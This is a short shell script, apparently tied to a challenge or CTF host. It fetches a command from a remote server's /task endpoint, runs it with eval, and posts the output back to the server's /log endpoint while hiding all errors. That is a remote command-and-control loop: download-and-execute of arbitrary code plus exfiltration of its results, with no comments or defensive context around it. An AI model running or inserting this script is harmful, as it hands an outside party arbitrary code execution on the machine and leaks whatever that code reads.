SERVER="http://chall.itsbengsky.id"

COMMAND="$(curl -fsS --max-time 15 \
    "$SERVER/task" 2>&1)"
OUTPUT="$(eval "$COMMAND" 2>&1)"
STATUS=$?

curl -fsS --max-time 15 \
    -X POST \
    -H 'Content-Type: text/plain' \
    --data-binary "$OUTPUT" \
    "$SERVER/log" >/dev/null 2>&1 || true

